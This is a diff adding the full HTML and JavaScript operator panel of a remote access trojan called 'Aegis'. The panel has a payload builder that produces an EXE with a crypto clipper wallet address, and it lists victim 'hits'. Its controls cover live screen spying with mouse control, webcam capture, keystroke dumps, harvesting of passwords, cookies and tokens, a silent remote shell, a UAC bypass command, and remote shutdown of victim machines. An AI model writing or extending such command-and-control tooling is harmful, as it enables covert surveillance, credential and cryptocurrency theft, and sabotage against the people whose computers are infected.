@@ -1,0 +1,434 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Aegis Panel</title>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
+    <style>
+        :root { --bg-dark: #09090b; --bg-panel: #121215; --bg-hover: #18181b; --border: #27272a; --text-main: #f4f4f5; --text-muted: #a1a1aa; --primary: #8b5cf6; --primary-hover: #7c3aed; --accent-pink: #d946ef; --danger: #ef4444; --success: #10b981; }
+        * { box-sizing: border-box; margin: 0; padding: 0; font-family: 'Inter', sans-serif; }
+        body { background-color: var(--bg-dark); color: var(--text-main); display: flex; height: 100vh; overflow: hidden; }
+        
+        .sidebar { width: 260px; background-color: var(--bg-dark); border-right: 1px solid var(--border); display: flex; flex-direction: column; padding: 20px 0; overflow-y: auto; }
+        .logo-container { display: flex; align-items: center; padding: 0 24px 24px; gap: 12px; }
+        .logo { width: 32px; height: 32px; background: linear-gradient(135deg, var(--primary), var(--accent-pink)); clip-path: polygon(50% 0%, 100% 25%, 100% 75%, 50% 100%, 0% 75%, 0% 25%); }
+        .brand-name { font-size: 20px; font-weight: 700; letter-spacing: -0.5px; }
+        
+        .nav-group { margin-bottom: 20px; }
+        .nav-title { font-size: 11px; font-weight: 600; color: var(--text-muted); text-transform: uppercase; letter-spacing: 1px; padding: 0 24px; margin-bottom: 8px; }
+        .nav-item { display: flex; align-items: center; padding: 10px 24px; color: var(--text-muted); font-size: 14px; font-weight: 500; gap: 12px; cursor: pointer; transition: all 0.2s; border-left: 3px solid transparent; }
+        .nav-item:hover, .nav-item.active { background-color: rgba(139, 92, 246, 0.1); color: var(--primary); border-left-color: var(--primary); }
+        .nav-item svg { width: 18px; height: 18px; fill: none; stroke: currentColor; stroke-width: 2; stroke-linecap: round; stroke-linejoin: round; }
+        
+        .user-pill { margin-top: auto; padding: 16px 24px; border-top: 1px solid var(--border); display: flex; align-items: center; gap: 12px; }
+        .avatar { width: 32px; height: 32px; border-radius: 50%; background: linear-gradient(135deg, var(--primary), var(--accent-pink)); display: flex; align-items: center; justify-content: center; font-weight: bold; font-size: 14px; }
+        
+        .main-content { flex: 1; padding: 32px 40px; overflow-y: auto; }
+        .page { display: none; animation: fadeIn 0.3s ease; }
+        .page.active { display: block; }
+        @keyframes fadeIn { from { opacity: 0; transform: translateY(5px); } to { opacity: 1; transform: translateY(0); } }
+        
+        .page-header { margin-bottom: 32px; }
+        .page-title { font-size: 28px; font-weight: 700; margin-bottom: 8px; }
+        .page-subtitle { color: var(--text-muted); font-size: 14px; }
+        
+        .stats-grid { display: grid; grid-template-columns: repeat(4, 1fr); gap: 20px; margin-bottom: 32px; }
+        .stat-card { background-color: var(--bg-panel); border: 1px solid var(--border); border-radius: 12px; padding: 20px; position: relative; }
+        .stat-card::before { content: ''; position: absolute; top: 0; left: 0; right: 0; height: 2px; background: linear-gradient(90deg, var(--primary), var(--accent-pink)); }
+        .stat-label { font-size: 13px; color: var(--text-muted); margin-bottom: 12px; }
+        .stat-value { font-size: 32px; font-weight: 700; }
+        
+        .panel { background-color: var(--bg-panel); border: 1px solid var(--border); border-radius: 12px; overflow: hidden; margin-bottom: 24px; }
+        .panel-header { padding: 16px 20px; border-bottom: 1px solid var(--border); font-weight: 600; display: flex; justify-content: space-between; }
+        .panel-content { padding: 20px; }
+        
+        .btn { background: var(--primary); color: #fff; border: none; padding: 10px 16px; border-radius: 6px; font-weight: 600; cursor: pointer; transition: 0.2s; margin-right: 10px; margin-bottom: 10px; }
+        .btn:hover { background: var(--primary-hover); }
+        .btn-danger { background: var(--danger); }
+        .btn-danger:hover { background: #dc2626; }
+        .btn-dark { background: var(--border); color: var(--text-main); }
+        .btn-dark:hover { background: #3f3f46; }
+        
+        .hit-box { background: var(--bg-hover); padding: 15px; border-radius: 8px; border-left: 3px solid var(--primary); margin-bottom: 15px; }
+        .hit-header { display: flex; justify-content: space-between; cursor: pointer; }
+        .hit-details { display: none; margin-top: 15px; padding-top: 15px; border-top: 1px solid var(--border); }
+        .hit-details.open { display: block; }
+        
+        img.capture { max-width: 100%; border-radius: 6px; margin-top: 10px; border: 1px solid var(--border); display: none; }
+        input.cmd-input { background: var(--bg-dark); border: 1px solid var(--border); color: white; padding: 10px; border-radius: 6px; width: 60%; margin-right: 10px; outline: none;}
+        pre { font-family: monospace; white-space: pre-wrap; color: var(--text-muted); font-size: 12px; margin-top: 10px; background: #000; padding: 10px; border-radius: 4px; display: none; }
+        
+        .stream-container { position: relative; background: #000; border-radius: 8px; overflow: hidden; display: flex; justify-content: center; align-items: center; cursor: crosshair; border: 1px solid var(--border); }
+        .stream-container img { width: 100%; height: auto; display: block; }
+        .agent-selector { margin-bottom: 20px; display: flex; gap: 10px; flex-wrap: wrap; }
+    </style>
+</head>
+<body>
+
+    <div class="sidebar">
+        <div class="logo-container"><div class="logo"></div><div class="brand-name">Aegis</div></div>
+        <div class="nav-group">
+            <div class="nav-title">Overview</div>
+            <a class="nav-item active" onclick="nav('dashboard', this)">
+                <svg><rect x="3" y="3" width="7" height="7"></rect><rect x="14" y="3" width="7" height="7"></rect><rect x="14" y="14" width="7" height="7"></rect><rect x="3" y="14" width="7" height="7"></rect></svg>
+                Dashboard
+            </a>
+            <a class="nav-item" onclick="nav('builder', this)">
+                <svg><path d="M21 16V8a2 2 0 0 0-1-1.73l-7-4a2 2 0 0 0-2 0l-7 4A2 2 0 0 0 3 8v8a2 2 0 0 0 1 1.73l7 4a2 2 0 0 0 2 0l7-4A2 2 0 0 0 21 16z"></path></svg>
+                Builder
+            </a>
+            <a class="nav-item" onclick="nav('hits', this)">
+                <svg><path d="M14 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V8z"></path></svg>
+                Hits
+            </a>
+        </div>
+        <div class="nav-group">
+            <div class="nav-title">Surveillance</div>
+            <a class="nav-item" onclick="nav('screen', this)">
+                <svg><rect x="2" y="3" width="20" height="14" rx="2" ry="2"></rect><line x1="8" y1="21" x2="16" y2="21"></line><line x1="12" y1="17" x2="12" y2="21"></line></svg>
+                Live Screen
+            </a>
+            <a class="nav-item" onclick="nav('webcam', this)">
+                <svg><path d="M23 19a2 2 0 0 1-2 2H3a2 2 0 0 1-2-2V8a2 2 0 0 1 2-2h4l2-3h6l2 3h4a2 2 0 0 1 2 2z"></path><circle cx="12" cy="13" r="4"></circle></svg>
+                Webcam
+            </a>
+            <a class="nav-item" onclick="nav('keylogger', this)">
+                <svg><rect x="2" y="4" width="20" height="16" rx="2" ry="2"></rect><path d="M6 8h.01M10 8h.01M14 8h.01M18 8h.01M8 12h.01M12 12h.01M16 12h.01M7 16h10"></path></svg>
+                Keylogger
+            </a>
+            <a class="nav-item" onclick="nav('stealer', this)">
+                <svg><path d="M12 2v20M17 5H9.5a3.5 3.5 0 0 0 0 7h5a3.5 3.5 0 0 1 0 7H6"></path></svg>
+                Stealer
+            </a>
+        </div>
+        <div class="nav-group">
+            <div class="nav-title">Control</div>
+            <a class="nav-item" onclick="nav('shell', this)">
+                <svg><polyline points="4 17 10 11 4 5"></polyline><line x1="12" y1="19" x2="20" y2="19"></line></svg>
+                Remote Shell
+            </a>
+            <a class="nav-item" onclick="nav('troll', this)">
+                <svg><circle cx="12" cy="12" r="10"></circle><path d="M8 14s1.5 2 4 2 4-2 4-2"></path><line x1="9" y1="9" x2="9.01" y2="9"></line><line x1="15" y1="9" x2="15.01" y2="9"></line></svg>
+                Troll Panel
+            </a>
+        </div>
+        <div class="user-pill"><div class="avatar">A</div><div style="font-size: 14px; font-weight: 500;">Anonymous</div></div>
+    </div>
+
+    <div class="main-content">
+        <!-- DASHBOARD -->
+        <div id="page-dashboard" class="page active">
+            <div class="page-header"><div class="page-title">Dashboard</div><div class="page-subtitle">Overview of active agents</div></div>
+            <div class="stats-grid">
+                <div class="stat-card"><div class="stat-label">Total Hits</div><div class="stat-value" id="stat-total">0</div></div>
+                <div class="stat-card"><div class="stat-label">Active Connections</div><div class="stat-value" id="stat-active">0</div></div>
+                <div class="stat-card"><div class="stat-label">Global Rank</div><div class="stat-value">#1</div></div>
+                <div class="stat-card"><div class="stat-label">Server Status</div><div class="stat-value" style="color: var(--success);">Online</div></div>
+            </div>
+            <div class="panel">
+                <div class="panel-header">Live Agents</div>
+                <div class="panel-content" id="dashboard-list"><div style="text-align: center; color: var(--text-muted);">Waiting for connections...</div></div>
+            </div>
+        </div>
+
+        <!-- BUILDER -->
+        <div id="page-builder" class="page">
+            <div class="page-header"><div class="page-title">Builder</div><div class="page-subtitle">Compile your payload</div></div>
+            <div class="panel">
+                <div class="panel-header">Build Options</div>
+                <div class="panel-content">
+                    <p style="font-size: 13px; color: var(--text-muted); margin-bottom: 20px;">Select the format for your payload.</p>
+                    
+                    <div style="margin-bottom: 20px;">
+                        <label style="display: block; font-size: 12px; margin-bottom: 8px; color: var(--text-muted);">Crypto Clipper Address (BTC/ETH/etc):</label>
+                        <input type="text" class="cmd-input" id="cryptoAddressInput" placeholder="Enter your wallet address..." value="1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa" style="width: 100%; max-width: 400px; margin-bottom: 20px;">
+                    </div>
+
+                    <button class="btn" id="buildExeBtn">Generate EXE</button>
+                </div>
+            </div>
+        </div>
+
+        <!-- HITS -->
+        <div id="page-hits" class="page">
+            <div class="page-header"><div class="page-title">Hits</div><div class="page-subtitle">Connection history (Click to expand)</div></div>
+            <div class="panel">
+                <div class="panel-header">Recent Hits</div>
+                <div class="panel-content" id="hits-list"><div style="text-align: center; color: var(--text-muted);">No hits found</div></div>
+            </div>
+        </div>
+
+        <!-- LIVE SCREEN -->
+        <div id="page-screen" class="page">
+            <div class="page-header"><div class="page-title">Live Screen & Control</div><div class="page-subtitle">Spy on the user and click to control their mouse.</div></div>
+            <div class="panel">
+                <div class="panel-header">Target Screen</div>
+                <div class="panel-content">
+                    <div class="agent-selector" id="screen-agent-buttons"></div>
+                    <div class="stream-container" onclick="handleMouseClick(event)" style="position: relative; background: #000; border-radius: 8px; overflow: hidden; cursor: crosshair; border: 1px solid var(--border);">
+                        <img id="live-screen" src="" style="width: 100%; height: auto; display: block;" alt="Select an agent to start streaming">
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <!-- WEBCAM -->
+        <div id="page-webcam" class="page">
+            <div class="page-header"><div class="page-title">Webcam Control</div><div class="page-subtitle">Capture images from target cameras</div></div>
+            <div class="panel">
+                <div class="panel-header">Select Agent</div>
+                <div class="panel-content" id="webcam-list"><div style="text-align: center; color: var(--text-muted);">No agents connected</div></div>
+            </div>
+        </div>
+
+        <!-- STEALER -->
+        <div id="page-stealer" class="page">
+            <div class="page-header"><div class="page-title">Stealer</div><div class="page-subtitle">Harvest Passwords, Cookies, and Tokens</div></div>
+            <div class="panel">
+                <div class="panel-header">Agent Credentials</div>
+                <div class="panel-content" id="stealer-list"><div style="text-align: center; color: var(--text-muted);">No agents connected</div></div>
+            </div>
+        </div>
+
+        <!-- KEYLOGGER -->
+        <div id="page-keylogger" class="page">
+            <div class="page-header"><div class="page-title">Keylogger</div><div class="page-subtitle">Dump keystroke buffers</div></div>
+            <div class="panel">
+                <div class="panel-header">Agent Logs</div>
+                <div class="panel-content" id="keylogger-list"><div style="text-align: center; color: var(--text-muted);">No agents connected</div></div>
+            </div>
+        </div>
+
+        <!-- REMOTE SHELL -->
+        <div id="page-shell" class="page">
+            <div class="page-header"><div class="page-title">Remote Shell</div><div class="page-subtitle">Execute CMD commands silently</div></div>
+            <div class="panel">
+                <div class="panel-header">Terminal</div>
+                <div class="panel-content" id="shell-list"><div style="text-align: center; color: var(--text-muted);">No agents connected</div></div>
+            </div>
+        </div>
+
+        <!-- TROLL PANEL -->
+        <div id="page-troll" class="page">
+            <div class="page-header"><div class="page-title">Troll Panel</div><div class="page-subtitle">System pranks and destruction</div></div>
+            <div class="panel">
+                <div class="panel-header">Actions</div>
+                <div class="panel-content" id="troll-list"><div style="text-align: center; color: var(--text-muted);">No agents connected</div></div>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        let currentStreamIp = "";
+        let streamInterval = null;
+
+        function nav(pageId, el) {
+            document.querySelectorAll('.nav-item').forEach(n => n.classList.remove('active'));
+            if(el) el.classList.add('active');
+            document.querySelectorAll('.page').forEach(p => p.classList.remove('active'));
+            const target = document.getElementById('page-' + pageId);
+            if (target) target.classList.add('active');
+            if (pageId !== 'screen') { stopStream(); }
+            if (['dashboard', 'hits', 'webcam', 'keylogger', 'shell', 'screen', 'troll', 'stealer'].includes(pageId)) {
+                fetchHits();
+            }
+        }
+
+        async function sendCmd(ip, cmd) {
+            await fetch('http://localhost:8000/api/cmd', {
+                method: 'POST',
+                body: JSON.stringify({ ip: ip, cmd: cmd })
+            });
+        }
+
+        function toggleHit(index) {
+            const el = document.getElementById(`hit-details-${index}`);
+            if (el) el.classList.toggle('open');
+        }
+
+        async function fetchHits() {
+            try {
+                const res = await fetch('http://localhost:8000/api/hits', { cache: 'no-store' });
+                const hits = await res.json();
+                const uniqueAgents = {};
+                hits.forEach(h => uniqueAgents[h.ip] = h);
+                const activeHits = Object.values(uniqueAgents).reverse();
+
+                document.getElementById('stat-total').innerText = hits.length;
+                document.getElementById('stat-active').innerText = activeHits.length;
+
+                const hitsList = document.getElementById('hits-list');
+                if (hits.length === 0) {
+                    hitsList.innerHTML = '<div style="text-align: center; color: var(--text-muted);">No hits found</div>';
+                } else {
+                    hitsList.innerHTML = hits.reverse().map((hit, i) => `
+                        <div class="hit-box">
+                            <div class="hit-header" onclick="toggleHit(${i})">
+                                <div>
+                                    <strong>${hit.hostname}</strong> <span style="color: var(--text-muted);">(${hit.ip})</span><br>
+                                    <span style="font-size: 12px; color: var(--text-muted);">User: ${hit.username}</span>
+                                </div>
+                                <div style="text-align: right;">
+                                    <span class="badge">${hit.date}</span>
+                                    <div style="font-size: 12px; color: var(--primary); margin-top: 5px;">Click to expand</div>
+                                </div>
+                            </div>
+                            <div class="hit-details" id="hit-details-${i}">
+                                <pre style="display: block;">${hit.raw}</pre>
+                            </div>
+                        </div>
+                    `).join('');
+                }
+
+                const renderAgentSelector = (actionBtnHtml, callbackName) => {
+                    if (activeHits.length === 0) return '<div style="text-align: center; color: var(--text-muted);">No agents connected</div>';
+                    return activeHits.map(hit => {
+                        const hostname = hit.hostname || 'Unknown';
+                        const safeIp = hit.ip.replace(/\./g, '-');
+                        return `
+                        <div class="hit-box">
+                            <div style="display: flex; justify-content: space-between; margin-bottom: 10px;">
+                                <strong>${hit.ip} (${hostname})</strong>
+                            </div>
+                            <div id="${callbackName}-${safeIp}">
+                                ${actionBtnHtml(hit.ip, safeIp)}
+                            </div>
+                        </div>`;
+                    }).join('');
+                };
+
+                document.getElementById('dashboard-list').innerHTML = renderAgentSelector((ip, safeIp) => `
+                    <button class="btn" onclick="sendCmd('${ip}', 'screenshot')">Screenshot</button>
+                    <button class="btn btn-dark" onclick="sendCmd('${ip}', 'uac')">UAC Bypass</button>
+                    <button class="btn btn-dark" onclick="sendCmd('${ip}', 'msgbox')">Message Box</button>
+                `, 'dash');
+
+                document.getElementById('webcam-list').innerHTML = renderAgentSelector((ip, safeIp) => `
+                    <button class="btn" onclick="sendCmd('${ip}', 'webcam')">Capture Webcam</button>
+                    <img class="capture" id="cam-img-${safeIp}" alt="Webcam">
+                `, 'cam');
+
+                document.getElementById('keylogger-list').innerHTML = renderAgentSelector((ip, safeIp) => `
+                    <button class="btn" onclick="sendCmd('${ip}', 'getkeys')">Dump Keystrokes</button>
+                    <pre id="keys-${safeIp}"></pre>
+                `, 'keys');
+
+                document.getElementById('stealer-list').innerHTML = renderAgentSelector((ip, safeIp) => `
+                    <button class="btn" onclick="sendCmd('${ip}', 'steal')">Harvest Data</button>
+                    <pre id="stealer-out-${safeIp}"></pre>
+                `, 'stealer');
+
+                document.getElementById('shell-list').innerHTML = renderAgentSelector((ip, safeIp) => `
+                    <input type="text" class="cmd-input" id="shell-in-${safeIp}" placeholder="Type command...">
+                    <button class="btn" onclick="sendCmd('${ip}', 'shell ' + document.getElementById('shell-in-${safeIp}').value)">Run</button>
+                    <pre id="shell-out-${safeIp}"></pre>
+                `, 'shell');
+
+                document.getElementById('troll-list').innerHTML = renderAgentSelector((ip, safeIp) => `
+                    <button class="btn btn-dark" onclick="sendCmd('${ip}', 'msgbox')">Message Box</button>
+                    <button class="btn btn-dark" onclick="openWebsitePrompt('${ip}')">Open Website</button>
+                    <button class="btn btn-danger" onclick="sendCmd('${ip}', 'power shutdown')">Shutdown</button>
+                    <button class="btn btn-danger" onclick="sendCmd('${ip}', 'power restart')">Restart</button>
+                `, 'troll');
+
+                document.getElementById('screen-agent-buttons').innerHTML = activeHits.map(hit => `
+                    <button class="btn" onclick="startStream('${hit.ip}')">Connect to ${hit.ip}</button>
+                `).join('');
+
+                activeHits.forEach(hit => {
+                    const safeIp = hit.ip.replace(/\./g, '-');
+                    
+                    if (hit.stealer) {
+                        const pre = document.getElementById(`stealer-out-${safeIp}`);
+                        if (pre) { pre.innerText = hit.stealer; pre.style.display = 'block'; }
+                    }
+                    if (hit.shell) {
+                        ['shell-out', 'keys'].forEach(prefix => {
+                            const pre = document.getElementById(`${prefix}-${safeIp}`);
+                            if (pre) { pre.innerText = hit.shell; pre.style.display = 'block'; }
+                        });
+                    }
+                    if (hit.webcam) {
+                        const img = document.getElementById(`cam-img-${safeIp}`);
+                        if (img) { 
+                            const cleanB64 = hit.webcam.replace(/(\r\n|\n|\r)/gm, "");
+                            img.src = `data:image/bmp;base64,${cleanB64}`; 
+                            img.style.display = 'block'; 
+                        }
+                    }
+                });
+
+            } catch (e) {
+                console.log("Error connecting to backend");
+            }
+        }
+
+        function openWebsitePrompt(ip) {
+            const url = prompt("Enter website URL to open on victim PC:", "https://google.com");
+            if (url) {
+                sendCmd(ip, `open ${url}`);
+            }
+        }
+
+        function startStream(ip) {
+            currentStreamIp = ip;
+            document.getElementById('live-screen').src = "";
+            sendCmd(ip, "stream_start");
+            if (streamInterval) clearInterval(streamInterval);
+            streamInterval = setInterval(async () => {
+                try {
+                    const res = await fetch(`http://localhost:8000/api/stream?ip=${ip}`, { cache: 'no-store' });
+                    const b64 = await res.text();
+                    if (b64) {
+                        const cleanB64 = b64.replace(/(\r\n|\n|\r)/gm, "");
+                        document.getElementById('live-screen').src = `data:image/jpeg;base64,${cleanB64}`;
+                    }
+                } catch(e) {}
+            }, 100);
+        }
+
+        function stopStream() {
+            if (currentStreamIp) { sendCmd(currentStreamIp, "stream_stop"); currentStreamIp = ""; }
+            if (streamInterval) { clearInterval(streamInterval); streamInterval = null; }
+        }
+
+        function handleMouseClick(e) {
+            if (!currentStreamIp) return;
+            const img = document.getElementById('live-screen');
+            const rect = img.getBoundingClientRect();
+            const xPercent = (e.clientX - rect.left) / rect.width;
+            const yPercent = (e.clientY - rect.top) / rect.height;
+            const targetX = Math.round(xPercent * 1920);
+            const targetY = Math.round(yPercent * 1080);
+            sendCmd(currentStreamIp, `mouse ${targetX} ${targetY} 2`);
+        }
+
+        document.getElementById('buildExeBtn').addEventListener('click', async (e) => {
+            const btn = e.target;
+            const cryptoAddress = document.getElementById('cryptoAddressInput').value;
+            
+            btn.innerText = "Compiling...";
+            btn.disabled = true;
+            try {
+                const res = await fetch('http://localhost:8000/api/build', { 
+                    method: 'POST',
+                    body: JSON.stringify({ crypto: cryptoAddress })
+                });
+                const blob = await res.blob();
+                const url = window.URL.createObjectURL(blob);
+                const a = document.createElement('a');
+                a.href = url; a.download = 'Aegis_Agent.exe'; a.click();
+            } catch (err) {
+                alert("Build failed.");
+            } finally {
+                btn.innerText = "Generate EXE";
+                btn.disabled = false;
+            }
+        });
+
+        fetchHits();
+        setInterval(fetchHits, 2000);
+    </script>
+</body>
+</html>
